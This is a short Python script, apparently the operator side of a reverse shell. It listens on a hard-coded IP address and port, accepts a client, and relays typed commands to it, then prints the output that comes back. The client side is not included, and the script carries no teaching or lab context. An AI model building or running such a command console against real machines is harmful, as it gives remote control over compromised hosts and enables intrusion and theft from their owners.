import sys
import socket

SERVER = "100.20.92.101"
PORT = 8080

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER, PORT))

s.listen(1)

while True:
    print(f'[*] Server listening to ...')

    client = s.accept()
    print(f'[+] client connected {client[1]}')

    client[0].send('connected'.encode())
    while True:
        cmd = input('>>> ')
        client[0].send(cmd.encode())

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        result = client[0].recv(1024).decode()
        print(result)

    client[0].close()

    cmd = input('Wait for new client y/n ') or 'y'
    if cmd.lower() in ['n', 'no']:
        break

s.close()
